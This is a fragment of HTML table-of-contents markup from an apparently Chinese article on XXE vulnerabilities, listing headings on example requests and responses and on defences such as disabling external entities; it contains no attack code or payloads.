href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94%EF%BC%9A"><span class="toc-number">5.3.2.</span> <span class="toc-text">进一步请求和响应：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E7%9A%84%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94%EF%BC%9A"><span class="toc-number">5.3.3.</span> <span class="toc-text">最终的请求和响应：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81XXE-%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1"><span class="toc-number">6.</span> <span class="toc-text">六、XXE 如何防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8%E8%AF%AD%E8%A8%80%E4%B8%AD%E6%8E%A8%E8%8D%90%E7%9A%84%E7%A6%81%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">6.1.</span> <span class="toc-text">方案一：使用语言中推荐的禁用外部实体的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%BA%8C%EF%BC%9A%E6%89%8B%E5%8A%A8%E9%BB%91%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4-%E4%B8%8D%E6%8E%A8%E8%8D%90"><span class="toc-number">6.2.</span> <span class="toc-text">方案二：手动黑名单过滤(不推荐)</span></a></li></ol></li></ol>	
         </div>
     
 </div>
